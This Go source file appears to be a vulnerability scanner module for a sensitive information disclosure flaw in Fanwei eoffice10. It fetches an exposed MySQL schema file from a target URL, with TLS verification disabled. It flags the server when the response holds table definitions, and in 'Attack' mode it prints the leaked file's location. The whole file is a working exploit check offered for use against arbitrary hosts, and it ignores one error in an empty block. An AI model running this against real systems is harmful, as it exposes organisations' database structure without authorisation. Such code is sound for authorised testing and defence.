package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func FanWeieoffice10_SensitiveInformationDisclosure(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/eoffice10/empty_scene/db/schema_mysql.sql", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode == 200 && strings.Contains(string(body), "CREATE TABLE") && strings.Contains(string(body), "NOT NULL COLLATE") {
		fmt.Println("[*]FanWeieoffice10_SensitiveInformationDisclosure : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s\n", url1))
		}
	}

	defer response.Body.Close()

	return nil
}
